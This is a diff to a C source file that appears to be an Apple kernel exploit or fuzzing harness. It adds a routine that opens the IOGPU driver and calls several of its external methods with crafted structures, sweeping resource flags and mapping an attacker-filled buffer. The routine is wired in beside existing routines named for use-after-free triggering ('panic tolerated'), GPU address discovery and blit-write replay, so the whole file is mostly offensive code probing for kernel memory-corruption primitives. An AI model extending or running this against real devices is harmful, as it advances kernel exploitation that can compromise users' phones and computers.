@@ -12818,6 +12818,62 @@ static void p_regdump(void) {
     LOG("[v73] done");
 }
 
+
+// V74: sel45 mapping path — for each resource-creation flag, create then bind.
+static void p_gpuva2(void) {
+    LOG("[v74] sel45 GPU mapping");
+    io_connect_t c = open_service("IOGPU", 1);
+    if (!c) return;
+    uint8_t *in = must_map(0x2000);
+    uint8_t *out = must_map(0x1000);
+    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
+    uint8_t *tgt = must_map(0x40000);
+    memset(tgt, 0x41, 0x40000);
+    memset(out, 0, 0x1000);
+    uint64_t a14[2] = { 0x100, 0x10 };
+    size_t osz = 0x10; nosc = 0;
+    IOConnectCallMethod(c, 14, a14, 2, NULL, 0, osc, &nosc, out, &osz);
+    uint64_t nqid = *(uint64_t *)(out + 8);
+    uint64_t qin[2] = {0, 0}, qout[2] = {0, 0};
+    uint32_t qc = 2;
+    IOConnectCallScalarMethod(c, 42, qin, 2, qout, &qc);
+    uint64_t vmid = qout[0];
+    uint64_t a44[2] = { vmid, nqid };
+    kern_return_t k44 = IOConnectCallScalarMethod(c, 44, a44, 2, NULL, NULL);
+    LOG("[m45] nqid %llu vmid %llu attach 0x%08x", nqid, vmid, k44);
+    if (k44) return;
+
+    static const uint8_t rf[] = { 0, 1, 2, 3, 6, 7, 0x40, 0x42 };
+    for (unsigned v = 0; v < sizeof(rf); v++) {
+        uint8_t *i2 = must_map(0x1000);
+        uint8_t *o2 = must_map(0x1000);
+        memset(i2, 0, 0x1000); memset(o2, 0, 0x1000);
+        *(uint32_t *)(i2 + 0x00) = 0x80;
+        *(uint32_t *)(i2 + 0x30) = 1;
+        i2[0x16] = rf[v];
+        *(uint64_t *)(i2 + 0x38) = (uint64_t)(uintptr_t)tgt + 0x4000;
+        *(uint64_t *)(i2 + 0x40) = (uint64_t)(uintptr_t)tgt;
+        *(uint64_t *)(i2 + 0x48) = 0x4000;
+        size_t os2 = 0x58; uint32_t n2 = 0; uint64_t oc2[4] = {0,0,0,0};
+        kern_return_t k9 = IOConnectCallMethod(c, 8, NULL, 0, i2, 0x68, oc2, &n2, o2, &os2);
+        uint32_t r2 = *(uint32_t *)(o2 + 0x24);
+        if (k9 || !r2) { LOG("[m45] f16 %02x create kr 0x%08x", rf[v], k9); continue; }
+        memset(in, 0, 0x1000);
+        *(uint32_t *)(in + 0x00) = 1;
+        *(uint32_t *)(in + 0x08) = r2;
+        *(uint32_t *)(in + 0x0c) = 0;
+        *(uint64_t *)(in + 0x10) = 0x100000;
+        *(uint8_t  *)(in + 0x18) = 0;
+        nosc = 0;
+        kern_return_t kb = IOConnectCallMethod(c, 45, NULL, 0, in, 0x20, osc, &nosc, NULL, NULL);
+        LOG("[m45] f16 %02x rid %u: sel45 -> kr 0x%08x", rf[v], r2, kb);
+        vm_deallocate(mach_task_self(), (vm_address_t)i2, 0x1000);
+        vm_deallocate(mach_task_self(), (vm_address_t)o2, 0x1000);
+        usleep(20000);
+    }
+    LOG("[v74] done (alive)");
+}
+
 static void p4b_uaf2(void) {
     LOG("[v13-d] UAF destroy-first (panic tolerated)");
     IOSurfaceRef big1 = make_surface(2048, 2048);
@@ -12948,6 +13004,7 @@ void *t_iosurface_scaler(void *arg) {
     static int probed = 0;
     if (!probed) {
         probed = 1;
+        p_gpuva2();         // v74: sel45 GPU mapping
         p_regdump();        // v73: IORegistry dump
         p_gpuva();          // v72: resource GPUVA discovery
         p_blitwrite();      // v70: blit write replay
